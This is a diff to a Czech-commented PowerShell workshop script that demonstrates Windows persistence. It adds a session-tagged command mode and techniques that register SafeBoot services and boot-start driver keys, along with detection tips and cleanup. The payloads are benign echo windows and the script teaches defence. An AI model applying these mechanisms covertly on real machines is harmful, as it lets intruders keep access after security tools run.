@@ -4,6 +4,12 @@
 # Ensure you run this script with administrative privileges.
 # Disclaimer: Unauthorized use of this script may violate laws and regulations. Always obtain permission before testing on any system.
 
+param(
+    [string]$SessionId = "",
+    [string]$Command = "",
+    [switch]$NoPrompt
+)
+
 <#
 .SYNOPSIS
     Windows Persistence Techniques Demonstration Script
@@ -16,6 +22,96 @@
     For educational purposes only.
     Always obtain proper authorization before testing on any system.
 #>
+
+function Format-SessionOutput {
+    param([string]$Message, [string]$SessionId)
+    if (-not $Message) { return $null }
+    if (-not $SessionId) { return $Message }
+    return "${SessionId}: $($Message.Trim())"
+}
+
+function Parse-SessionCommand {
+    param([string]$Text, [string]$SessionId)
+    if (-not $Text) { return @{ SessionId = $null; Command = $null; IsForThisSession = $false } }
+
+    $trim = $Text.Trim()
+    if ($trim -match '^(?:@([A-Za-z0-9]+)\s+)?(.+)$') {
+        $sessionMatch = $Matches[1]
+        $command = $Matches[2].Trim()
+        $isForThisSession = ($null -eq $sessionMatch) -or ($sessionMatch -eq $SessionId)
+        return @{ SessionId = $sessionMatch; Command = $command; IsForThisSession = $isForThisSession }
+    }
+
+    return @{ SessionId = $null; Command = $trim; IsForThisSession = $false }
+}
+
+function Invoke-FilteredPersistenceCommand {
+    param([string]$CommandText, [string]$SessionId)
+
+    $parsed = Parse-SessionCommand -Text $CommandText -SessionId $SessionId
+    if (-not $parsed.IsForThisSession) { return $null }
+
+    switch ($parsed.Command) {
+        "+help" {
+            return "[DEMO] Dostupne prikazy: +startup, +run, +runonce, +schedule, +status, +cleanup"
+        }
+        "+startup" {
+            $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
+            $filePath = Join-Path $startupPath "spust.cmd"
+            'cmd /k echo Soubor spusten ve vlasnim profilu ve startup slozce.' | Set-Content -Path $filePath -Encoding UTF8
+            return "[OK] Startup persistence vytvorena: $filePath"
+        }
+        "+run" {
+            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+            $valueName = "demo"
+            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
+            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
+            return "[OK] HKCU Run záznam přidán: $valueName -> $valueData"
+        }
+        "+runonce" {
+            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            $valueName = "demoOnce"
+            $valueData = 'cmd /k echo Me spousti RunOnce v HKCU - spusti se jednou pri dalsim prihlaseni a pak se automaticky smaze'
+            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
+            return "[OK] HKCU RunOnce záznam přidán: $valueName -> $valueData"
+        }
+        "+schedule" {
+            $taskName = "Demo30MinTask"
+            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/k echo Me spustila pravidelna uloha"
+            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).Date
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
+            return "[OK] Scheduled task vytvořena: $taskName"
+        }
+        "+status" {
+            $status = Get-PersistenceStatus
+            $parts = @()
+            foreach ($key in $status.Keys | Sort-Object) {
+                $parts += "$key=$($status[$key])"
+            }
+            return "[STATUS] " + ($parts -join '; ')
+        }
+        "+cleanup" {
+            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\demo" -ErrorAction SilentlyContinue
+            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce\demoOnce" -ErrorAction SilentlyContinue
+            if (Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") {
+                Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd" -Force -ErrorAction SilentlyContinue
+            }
+            Get-ScheduledTask -TaskName "Demo30MinTask" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false
+            return "[OK] Demo persistence odstraněna."
+        }
+        default {
+            return $null
+        }
+    }
+}
+
+if ($Command) {
+    $sessionOutput = Invoke-FilteredPersistenceCommand -CommandText $Command -SessionId $SessionId
+    if ($sessionOutput) {
+        Write-Output (Format-SessionOutput -Message $sessionOutput -SessionId $SessionId)
+    }
+    exit
+}
 
 function Test-Administrator {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -170,6 +266,15 @@ function Get-PersistenceStatus {
     # 35) Kernel Driver
     $status[35] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver"
     
+    # 36) Safe Mode with Networking persistence
+    $safeModeService = Get-Service -Name "DemoSafeModeNet" -ErrorAction SilentlyContinue
+    $safeModeReg = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DemoSafeModeNet"
+    $status[36] = ($null -ne $safeModeService) -and $safeModeReg
+    
+    # 37) Boot-Start Driver (Bootkit demonstration)
+    $bootDriver = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoBootDriver" -ErrorAction SilentlyContinue
+    $status[37] = ($null -ne $bootDriver) -and ($bootDriver.Start -eq 0)
+    
     return $status
 }
 
@@ -206,7 +311,7 @@ function Show-Menu {
     Write-Host " 15) $(Format-Status $st[15]) RunOnce klic (HKCU)"
     Write-Host " 17) $(Format-Status $st[17]) PowerShell Profile (CurrentUser)"
     Write-Host " 18) $(Format-Status $st[18]) COM Hijacking (HKCU CLSID)"
-    Write-Host " 23) $(Format-Status $st[23]) Planovana uloha spustena PRI ZAMKNUTI OBRAZOVKY (aha demo)" -ForegroundColor Magenta
+    Write-Host " 23) $(Format-Status $st[23]) Planovana uloha spustena PRI ZAMKNUTI OBRAZOVKY" -ForegroundColor Magenta
     Write-Host " 30) $(Format-Status $st[30]) File Association Hijack (.demopers -> cmd.exe)"
     Write-Host " 34) $(Format-Status $st[34]) Shortcut Modification (.lnk hijack)"
     Write-Host ""
@@ -229,11 +334,13 @@ function Show-Menu {
     Write-Host " 26) $(Format-Status $st[26]) Print Port Monitor (spoolsv DLL)"
     Write-Host " 27) $(Format-Status $st[27]) Time Provider (W32Time DLL)"
     Write-Host " 28) $(Format-Status $st[28]) Security Support Provider (LSA - POZOR)" -ForegroundColor Red
-    Write-Host " 29) $(Format-Status $st[29]) Silent Process Exit (notepad close - aha demo 2)" -ForegroundColor Magenta
+    Write-Host " 29) $(Format-Status $st[29]) Silent Process Exit (notepad close)" -ForegroundColor Magenta
     Write-Host " 31) $(Format-Status $st[31]) Sethc.exe Hijack (Sticky Keys - 5x Shift)" -ForegroundColor Red
     Write-Host " 32) $(Format-Status $st[32]) OSK.exe Hijack (On-Screen Keyboard)" -ForegroundColor Red
     Write-Host " 33) $(Format-Status $st[33]) LSA Authentication Package" -ForegroundColor Red
     Write-Host " 35) $(Format-Status $st[35]) Kernel Driver Persistence (Type=1 Service)" -ForegroundColor Red
+    Write-Host " 36) $(Format-Status $st[36]) Safe Mode with Networking Persistence" -ForegroundColor Red
+    Write-Host " 37) $(Format-Status $st[37]) Boot-Start Driver (Bootkit demonstration)" -ForegroundColor Red
     Write-Host ""
     Write-Host "--- Ostatni ---" -ForegroundColor Cyan
     Write-Host " 90) Restartovat skript jako Administrator (UAC prompt)" -ForegroundColor Yellow
@@ -308,7 +415,7 @@ do {
             $filePath = Join-Path $startupPath "spust.cmd"
             'cmd /k echo Soubor spusten ve startup slozce pro vsechny uzivatele.' | Set-Content -Path $filePath -Encoding UTF8
             Write-Host "Soubor 'spust.cmd' byl vytvoren ve Startup vsech uzivatelu."
-            Write-Host "Pridano: Soubor ve vse-uzivatelskem Startup -> $filePath" -ForegroundColor Green
+            Write-Host "Pridano: Soubor ve Startup slozce pro vsechny uzivatele -> $filePath" -ForegroundColor Green
             Write-Host "Kdy se spousti: po prihlaseni kterhokoliv uzivatele. Pouziti: system-wide uzivatelska perzistence." -ForegroundColor Yellow
             Log-Action "Created all-users startup file: $filePath"
         }
@@ -344,7 +451,7 @@ do {
             New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
             Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM WOW6432Node."
             Write-Host "Pridano: HKLM WOW6432Node Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
-            Write-Host "Kdy se spousti: pri spusteni 32bitove aplikace/pri prihlaseni. Pouziti: persistence pro 32-bitovych procesu na 64-bit systemu." -ForegroundColor Yellow
+            Write-Host "Kdy se spousti: pri spusteni 32bitove aplikace/pri prihlaseni. Pouziti: perzistence pro 32bitove procesy na 64bitovem systemu." -ForegroundColor Yellow
             Log-Action "Added HKLM WOW6432Node Run entry: $valueName -> $valueData"
         }
         7 { 
@@ -355,7 +462,7 @@ do {
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
             Write-Host "Naplanovana uloha '$taskName' byla vytvorena."
             Write-Host "Pridano: Scheduled Task -> $taskName; Action: cmd.exe $action; Trigger: every 30 minutes" -ForegroundColor Green
-            Write-Host "Kdy se spousti: podle triggrovaneho casu (zde kazdych 30 minut). Pouziti: pravidelna/periodicka perzistence." -ForegroundColor Yellow
+            Write-Host "Kdy se spousti: podle nastaveneho casoveho triggeru (zde kazdych 30 minut). Pouziti: pravidelna/periodicka perzistence." -ForegroundColor Yellow
             Log-Action "Registered scheduled task: $taskName; Trigger=30min"
         }
         8 { 
@@ -363,7 +470,7 @@ do {
             Write-Host "Debugger: Zkontrolujte klic 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'."
             $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe"
             $valueName = "Debugger"
-            $valueData = 'cmd /k echo Me spustila perzistence z debuggeru a tady lze spustit cokoli poc uctem: %username%'
+            $valueData = 'cmd /k echo Me spustila perzistence z debuggeru a tady lze spustit cokoli pod uctem: %username%'
             New-Item -Path $regPath -Force | Out-Null
             New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
             Write-Host "Do registru byl pridan klic $regPath a hodnota $valueName typu REG_SZ."
@@ -540,7 +647,7 @@ do {
             Write-Host "Do registru byl pridan CLSID $demoGuid."
             Write-Host "Pridano: COM Hijacking -> HKCU\Software\Classes\CLSID\$demoGuid\InprocServer32" -ForegroundColor Green
             Write-Host "Kdy se spousti: kdyz nejaky proces vytvori COM objekt s timto CLSID (v realu se hijackuje CLSID, ktery volaji explorer/office/browser)." -ForegroundColor Yellow
-            Write-Host "Poznamka: v tomto demu jsou pouzity smyslneny GUID a exe misto DLL - realny utok by hijacknul znamy CLSID a nahradil DLL." -ForegroundColor Yellow
+            Write-Host "Poznamka: v tomto demu jsou pouzity smyslene GUID a exe misto DLL - realny utok by hijacknul znamy CLSID a nahradil DLL." -ForegroundColor Yellow
             Log-Action "Added COM Hijack CLSID: $demoGuid -> cmd.exe"
         }
         19 {
@@ -597,7 +704,7 @@ do {
         }
         22 {
             # Winlogon Userinit - hodnota, ktera se spousti hned po prihlaseni jako prvni.
-            # POZOR na spravnou syntaxi vcetne koncove carky - jinak muze byt prihlaseni rozbite.
+            # POZOR na spravnou syntaxi vcetne koncove carky - jinak se muze prihlaseni rozbit.
             if (-not (Require-Administrator)) { break }
             Write-Host "Winlogon Userinit: 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'."
             Write-Host "POZOR: Zmena Userinit muze rozbit prihlaseni! Format vyzaduje presnou syntaxi vcetne koncove carky." -ForegroundColor Red
@@ -613,7 +720,7 @@ do {
         }
         23 {
             # Scheduled Task s netradicnim triggerem SESSION_STATE_CHANGE (zamknuti obrazovky).
-            # AHA DEMO pro workshop: skolitel spusti tuto volbu, stiskne Win+L a po odemknuti se objevi cmd.exe.
+            # DEMO pro workshop: skolitel spusti tuto volbu, stiskne Win+L a po odemknuti se objevi cmd.exe.
             Write-Host "Planovana uloha spustena pri ZAMKNUTI OBRAZOVKY (SESSION_LOCK)."
             Write-Host "Po dokonceni stisknte Win+L. Po odemknuti se objevi viditelne okno cmd.exe." -ForegroundColor Magenta
             try {
@@ -748,7 +855,7 @@ do {
         29 {
             # Silent Process Exit (SPE) - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<exe>
             # Spusti prikaz kdyz cilovy proces UKONCI (opak IFEO Debugger - ten spousti pri STARTU).
-            # AHA DEMO 2: otevrete notepad, zavrete ho - vyskoci cmd.exe.
+            # DEMO 2: otevrete notepad, zavrete ho - vyskoci cmd.exe.
             if (-not (Require-Administrator)) { break }
             Write-Host "Silent Process Exit (SPE) - trigger PRI UKONCENI procesu (opak IFEO Debugger)." -ForegroundColor Magenta
             $target = "notepad.exe"
@@ -762,7 +869,7 @@ do {
             Write-Host "Pridano: SPE hook pro '$target' -> pri jeho ukonceni se spusti cmd.exe." -ForegroundColor Green
             Write-Host "Kdy se spousti: pri UKONCENI cilovyho procesu (notepad.exe)." -ForegroundColor Yellow
             Write-Host "Pouziti: netradicni trigger - reakce na ZAVRENI programu, ne jeho spusteni." -ForegroundColor Yellow
-            Write-Host "TIP pro skolitele: otevrete notepad.exe, zavrete ho krizkem - okamzite vyskoci cmd.exe. Perfektni 'aha' okamzik!" -ForegroundColor Magenta
+            Write-Host "TIP pro skolitele: otevrete notepad.exe, zavrete ho krizkem - okamzite vyskoci cmd.exe." -ForegroundColor Magenta
             Log-Action "Added Silent Process Exit hook for notepad.exe -> cmd.exe"
         }
         30 {
@@ -853,7 +960,7 @@ do {
                 $Shortcut.Save()
                 Write-Host "Pridano: Desktop shortcut '$testLnkPath' -> Target: cmd.exe" -ForegroundColor Green
                 Write-Host "Kdy se spousti: kdyz uzivatel klikne na shortcut (Desktop, Taskbar, Start Menu)." -ForegroundColor Yellow
-                Write-Host "Pouziti: velmi nenападne - hijack existujicich shortcutu (Chrome, Outlook, Word) -> uzivatel nevidi rozdil." -ForegroundColor Yellow
+                Write-Host "Pouziti: velmi nenapadne - hijack existujicich shortcutu (Chrome, Outlook, Word) -> uzivatel nevidi rozdil." -ForegroundColor Yellow
                 Write-Host "TIP: kliknete na 'DemoShortcut' na Desktopu - spusti se cmd.exe misto puvodni aplikace." -ForegroundColor Cyan
                 Log-Action "Created hijacked .lnk shortcut: $testLnkPath -> cmd.exe"
             } catch {
@@ -862,7 +969,7 @@ do {
             }
         }
         35 {
-            # Kernel Driver Persistence - Type=1 Service (vyžaduje testsigning nebo valid signature)
+            # Kernel Driver Persistence - Type=1 Service (vyzaduje testsigning nebo valid signature)
             if (-not (Require-Administrator)) { break }
             Write-Host "Kernel Driver Persistence (Service Type=1)."
             Write-Host "POZOR: Kernel driver vyzaduje SIGNED driver nebo test mode (bcdedit /set testsigning on)." -ForegroundColor Red
@@ -879,6 +986,182 @@ do {
             Write-Host "Pouziti: rootkit-level persistence - kernel mode, neviditelne pro user-mode monitory." -ForegroundColor Yellow
             Write-Host "Detekce: Services registry (Type=1), driver file check, bootkit scanners." -ForegroundColor Yellow
             Log-Action "Created kernel driver service registry: DemoDriver (driver file neexistuje - demo only)"
+        }
+        36 {
+            # Safe Mode with Networking Persistence
+            # V Safe Mode se spousti pouze sluzby a ovladace zaregistrovane v HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\*
+            # Tato technika umoznuje persistenci, ktera prezije i restart do Safe Mode (kde obvykle persistence metody nefunguji)
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Safe Mode with Networking Persistence" -ForegroundColor Cyan
+            Write-Host "POZOR: Tato persistence se spusti i v Safe Mode with Networking - obchazi bezne bezpecnostni techniky!" -ForegroundColor Red
+            
+            try {
+                # 1) Vytvorime Windows Service
+                $serviceName = "DemoSafeModeNet"
+                $binPath = 'cmd.exe /k echo === SAFE MODE PERSISTENCE === Spustena sluzba v Safe Mode with Networking! PC: %COMPUTERNAME% ==='
+                
+                # Kontrola, jestli sluzba uz neexistuje
+                $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+                if ($existingService) {
+                    Write-Host "Sluzba $serviceName uz existuje, mazu..." -ForegroundColor Yellow
+                    sc.exe stop $serviceName 2>$null | Out-Null
+                    sc.exe delete $serviceName 2>$null | Out-Null
+                    Start-Sleep -Seconds 2
+                }
+                
+                # Vytvorime sluzbu s AUTO start
+                Write-Host "Vytvarim sluzbu '$serviceName'..." -ForegroundColor Cyan
+                sc.exe create $serviceName binPath= "$binPath" start= auto DisplayName= "Demo Safe Mode Network Service" | Out-Null
+                
+                if ($LASTEXITCODE -ne 0) {
+                    Write-Host "Chyba pri vytvareni sluzby (sc.exe exit code: $LASTEXITCODE)" -ForegroundColor Red
+                    Log-Action "ERROR creating service $serviceName - sc.exe failed with code $LASTEXITCODE"
+                    break
+                }
+                
+                # 2) Pridame sluzbu do Safe Mode whitelistu pro Minimal a Network
+                Write-Host "Registruji sluzbu pro Safe Mode with Networking..." -ForegroundColor Cyan
+                
+                # Safe Boot Minimal (zakladni Safe Mode bez site)
+                $safeModeMinPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\$serviceName"
+                if (-not (Test-Path $safeModeMinPath)) { 
+                    New-Item -Path $safeModeMinPath -Force | Out-Null 
+                }
+                New-ItemProperty -Path $safeModeMinPath -Name "(Default)" -Value "Service" -PropertyType String -Force | Out-Null
+                
+                # Safe Boot Network (Safe Mode se siti)
+                $safeModeNetPath = "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\$serviceName"
+                if (-not (Test-Path $safeModeNetPath)) { 
+                    New-Item -Path $safeModeNetPath -Force | Out-Null 
+                }
+                New-ItemProperty -Path $safeModeNetPath -Name "(Default)" -Value "Service" -PropertyType String -Force | Out-Null
+                
+                Write-Host "" 
+                Write-Host "================================================================" -ForegroundColor Green
+                Write-Host "Pridano: Safe Mode persistence" -ForegroundColor Green
+                Write-Host "  - Sluzba: $serviceName" -ForegroundColor Green
+                Write-Host "  - Binary: cmd.exe (s viditelnym oknem)" -ForegroundColor Green
+                Write-Host "  - SafeBoot\Minimal: $safeModeMinPath" -ForegroundColor Green
+                Write-Host "  - SafeBoot\Network:  $safeModeNetPath" -ForegroundColor Green
+                Write-Host "================================================================" -ForegroundColor Green
+                Write-Host ""
+                Write-Host "JAK OTESTOVAT:" -ForegroundColor Magenta
+                Write-Host "  1) Restartujte pocitac do Safe Mode with Networking:" -ForegroundColor Yellow
+                Write-Host "     - Drzet Shift pri restartu -> Troubleshoot -> Advanced -> Startup Settings -> Restart" -ForegroundColor Yellow
+                Write-Host "     - Nebo: msconfig -> Boot -> Safe boot: Network" -ForegroundColor Yellow
+                Write-Host "  2) Po restartu do Safe Mode se automaticky spusti cmd.exe okno" -ForegroundColor Yellow
+                Write-Host "  3) V Safe Mode muzete otevrit services.msc a videt '$serviceName' ve stavu Running" -ForegroundColor Yellow
+                Write-Host ""
+                Write-Host "KDY SE SPOUSTI: pri kazdem startu systemu (vcetne Normal i Safe Mode with Networking)" -ForegroundColor Yellow
+                Write-Host "POUZITI: persistence, ktera obchazi bezpecnostni techniky jako AV/EDR (ty obvykle v Safe Mode nebehou)" -ForegroundColor Yellow
+                Write-Host "         - Utocnik tak muze provest cinnost i kdyz obrana probehne do Safe Mode" -ForegroundColor Yellow
+                Write-Host "         - Klasicka technika pro ransomware a rootkity" -ForegroundColor Yellow
+                Write-Host ""
+                Write-Host "DETEKCE: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal a Network klice" -ForegroundColor Cyan
+                Write-Host "         Services.msc -> hledani podezrelych sluzeb" -ForegroundColor Cyan
+                Write-Host "         Autoruns -> Options -> Include Empty Locations -> SafeBoot" -ForegroundColor Cyan
+                Write-Host ""
+                
+                Log-Action "Created Safe Mode persistence: service=$serviceName, SafeBoot keys created"
+            } catch {
+                Write-Host "Chyba pri vytvareni Safe Mode persistence: $_" -ForegroundColor Red
+                Log-Action "ERROR creating Safe Mode persistence: $_"
+            }
+        }
+        37 {
+            # Boot-Start Driver (Bootkit demonstration)
+            # Start=0 znamena SERVICE_BOOT_START - spousti se DRIVE nez kernel inicializuje subsystemy
+            # Type=1 = KERNEL_DRIVER
+            # V realu by to byl MBR rootkit nebo UEFI bootkit, zde jen demonstrace registry artefaktu
+            if (-not (Require-Administrator)) { break }
+            Write-Host "Boot-Start Driver (Bootkit Demonstration)" -ForegroundColor Cyan
+            Write-Host "" 
+            Write-Host "================================================================" -ForegroundColor Yellow
+            Write-Host "  POZOR: TOTO JE POUZE DEMONSTRACE REGISTRY ARTEFAKTU!" -ForegroundColor Yellow
+            Write-Host "  Driver soubor NEEXISTUJE - system ho preskoci pri bootu." -ForegroundColor Yellow
+            Write-Host "  Ukazuje pouze KDE a JAK se bootkit registruje." -ForegroundColor Yellow
+            Write-Host "================================================================" -ForegroundColor Yellow
+            Write-Host "" 
+            
+            try {
+                $driverName = "DemoBootDriver"
+                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$driverName"
+                
+                Write-Host "Vytvarim Boot-Start Driver registry klic..." -ForegroundColor Cyan
+                
+                if (-not (Test-Path $regPath)) { 
+                    New-Item -Path $regPath -Force | Out-Null 
+                }
+                
+                # Klicove hodnoty pro Boot-Start Driver
+                New-ItemProperty -Path $regPath -Name "Type" -Value 1 -PropertyType DWord -Force | Out-Null  # KERNEL_DRIVER
+                New-ItemProperty -Path $regPath -Name "Start" -Value 0 -PropertyType DWord -Force | Out-Null  # BOOT_START !!!
+                New-ItemProperty -Path $regPath -Name "ErrorControl" -Value 1 -PropertyType DWord -Force | Out-Null  # SERVICE_ERROR_NORMAL
+                New-ItemProperty -Path $regPath -Name "Group" -Value "Boot Bus Extender" -PropertyType String -Force | Out-Null
+                New-ItemProperty -Path $regPath -Name "ImagePath" -Value "System32\drivers\demo_bootkit.sys" -PropertyType String -Force | Out-Null
+                New-ItemProperty -Path $regPath -Name "DisplayName" -Value "Demo Boot-Start Driver (Educational Bootkit Artifact)" -PropertyType String -Force | Out-Null
+                New-ItemProperty -Path $regPath -Name "Description" -Value "DEMO: Ukazuje registry artefakt boot-level persistence. Driver neexistuje." -PropertyType String -Force | Out-Null
+                
+                Write-Host "" 
+                Write-Host "================================================================" -ForegroundColor Green
+                Write-Host "Pridano: Boot-Start Driver registry artefakt" -ForegroundColor Green
+                Write-Host "  - Service: $driverName" -ForegroundColor Green
+                Write-Host "  - Registry: $regPath" -ForegroundColor Green
+                Write-Host "  - Type: 1 (KERNEL_DRIVER)" -ForegroundColor Green
+                Write-Host "  - Start: 0 (BOOT_START) <- Klicove!" -ForegroundColor Green
+                Write-Host "  - Group: Boot Bus Extender" -ForegroundColor Green
+                Write-Host "  - ImagePath: System32\drivers\demo_bootkit.sys (NEEXISTUJE)" -ForegroundColor Green
+                Write-Host "================================================================" -ForegroundColor Green
+                Write-Host "" 
+                Write-Host "CO TO DEMONSTRUJE:" -ForegroundColor Magenta
+                Write-Host "  - Boot-Start Drivers (Start=0) se nacitaji PRED Winlogon, PRED Session Manager" -ForegroundColor Yellow
+                Write-Host "  - Spousteji se v KERNEL MODE (Ring 0) - plny pristup k hardware i pameti" -ForegroundColor Yellow
+                Write-Host "  - Mohou presmerovat disk I/O, skryt soubory, procesy, registry klice" -ForegroundColor Yellow
+                Write-Host "  - Realne bootkity modifikuji MBR (Legacy BIOS) nebo UEFI firmware" -ForegroundColor Yellow
+                Write-Host "" 
+                Write-Host "TYPY BOOT-LEVEL MALWARE (edukativni prehled):" -ForegroundColor Cyan
+                Write-Host "  1) MBR Rootkits (Legacy BIOS systemy):" -ForegroundColor White
+                Write-Host "     - TDL4/TDSS, Rovnix, Olmasco, Sinowal" -ForegroundColor Gray
+                Write-Host "     - Modifikuji prvnich 512 bytu disku (Master Boot Record)" -ForegroundColor Gray
+                Write-Host "     - Spousteji se PRED operacnim systemem" -ForegroundColor Gray
+                Write-Host "  2) UEFI Bootkits (moderni systemy):" -ForegroundColor White
+                Write-Host "     - LoJax (APT28/Fancy Bear), MosaicRegressor, ESPecter, BlackLotus" -ForegroundColor Gray
+                Write-Host "     - Modifikuji UEFI firmware nebo ESP (EFI System Partition)" -ForegroundColor Gray
+                Write-Host "     - Preziji REINSTALACI OS i VYMENU DISKU (ulozeno ve firmware)!" -ForegroundColor Gray
+                Write-Host "  3) Boot-Start Drivers (tato demonstrace):" -ForegroundColor White
+                Write-Host "     - Legitimni Windows mechanismus (pouzivaji antiviry - ELAM)" -ForegroundColor Gray
+                Write-Host "     - Start=0 v registry Services" -ForegroundColor Gray
+                Write-Host "     - Na modernim Windows vyzaduje WHQL podpis nebo Test Mode" -ForegroundColor Gray
+                Write-Host "" 
+                Write-Host "DETEKCE:" -ForegroundColor Cyan
+                Write-Host "  - Autoruns -> Drivers tab -> filtr 'Boot' nebo 'System'" -ForegroundColor Yellow
+                Write-Host "  - PowerShell: Get-Service | Where Start -eq 0" -ForegroundColor Yellow
+                Write-Host "  - Registry: HKLM\SYSTEM\CurrentControlSet\Services\* kde Start=0" -ForegroundColor Yellow
+                Write-Host "  - Sysmon EID 6 (DriverLoad) + EID 13 (RegistrySetValue)" -ForegroundColor Yellow
+                Write-Host "  - Bootkit scannery: GMER, TDSSKiller, Rootkit Revealer" -ForegroundColor Yellow
+                Write-Host "  - UEFI firmware integrita: chipsec, UEFITool" -ForegroundColor Yellow
+                Write-Host "" 
+                Write-Host "MODERNA OCHRANA:" -ForegroundColor Cyan
+                Write-Host "  - UEFI Secure Boot (podepsane bootloadery)" -ForegroundColor Yellow
+                Write-Host "  - TPM + Measured Boot (detekce zmen boot procesu)" -ForegroundColor Yellow
+                Write-Host "  - ELAM (Early Launch Anti-Malware) - AV nacitane pred drivery" -ForegroundColor Yellow
+                Write-Host "  - Driver Signature Enforcement (Windows 10+)" -ForegroundColor Yellow
+                Write-Host "  - Virtualization-based Security (VBS) - Credential Guard, HVCI" -ForegroundColor Yellow
+                Write-Host "" 
+                Write-Host "PROC TOTO V DEMU NENI SKUTECNY BOOTKIT:" -ForegroundColor Magenta
+                Write-Host "  1) Driver soubor demo_bootkit.sys NEEXISTUJE - system ho preskoci" -ForegroundColor Gray
+                Write-Host "  2) Zadna modifikace MBR ani UEFI firmware" -ForegroundColor Gray
+                Write-Host "  3) System zustane PLNE BOOTOVATELNY" -ForegroundColor Gray
+                Write-Host "  4) Pouze REGISTRY ARTEFAKT pro demonstraci detekce" -ForegroundColor Gray
+                Write-Host "" 
+                Write-Host "MITRE ATT&CK: T1542.003 (Bootkit), T1014 (Rootkit)" -ForegroundColor Cyan
+                Write-Host "" 
+                
+                Log-Action "Created Boot-Start Driver registry artifact: $driverName (Type=1, Start=0, driver file NEEXISTUJE - demo only)"
+            } catch {
+                Write-Host "Chyba pri vytvareni Boot-Start Driver: $_" -ForegroundColor Red
+                Log-Action "ERROR creating Boot-Start Driver: $_"
+            }
         }
         0 {
             Write-Host "Ukoncuji skript." -ForegroundColor Cyan
@@ -1108,6 +1391,25 @@ do {
             # 35 Kernel Driver service
             Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver" -Recurse -Force -ErrorAction SilentlyContinue
             Log-Action "Removed kernel driver service registry: DemoDriver"
+
+            # 36 Safe Mode with Networking persistence
+            try {
+                $serviceName = "DemoSafeModeNet"
+                $svc = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+                if ($svc) {
+                    sc.exe stop $serviceName 2>$null | Out-Null
+                    sc.exe delete $serviceName 2>$null | Out-Null
+                }
+                Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\$serviceName" -Recurse -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\$serviceName" -Recurse -Force -ErrorAction SilentlyContinue
+                Log-Action "Removed Safe Mode persistence: service $serviceName and SafeBoot registry keys"
+            } catch {
+                Log-Action "ERROR removing Safe Mode persistence: $_"
+            }
+
+            # 37 Boot-Start Driver
+            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoBootDriver" -Recurse -Force -ErrorAction SilentlyContinue
+            Log-Action "Removed Boot-Start Driver registry artifact: DemoBootDriver"
 
             Write-Host "Vsechny persistence techniky byly odstraneny."
         }
